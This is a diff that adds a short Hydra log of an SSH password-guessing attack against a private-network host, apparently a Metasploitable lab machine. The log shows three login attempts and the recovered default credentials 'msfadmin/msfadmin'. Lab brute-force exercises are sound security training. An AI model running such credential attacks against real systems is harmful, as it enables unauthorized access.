@@ -1,0 +1,8 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC
+Starting at 2026-03-20 15:07:43
+[DATA] attacking ssh://192.168.6.129:22/
+[ATTEMPT] target 192.168.6.129 - login "msfadmin" - pass "password"
+[ATTEMPT] target 192.168.6.129 - login "msfadmin" - pass "123456"
+[ATTEMPT] target 192.168.6.129 - login "msfadmin" - pass "msfadmin"
+[22][ssh] host: 192.168.6.129   login: msfadmin   password: msfadmin
+1 of 1 target successfully completed, 1 valid password found
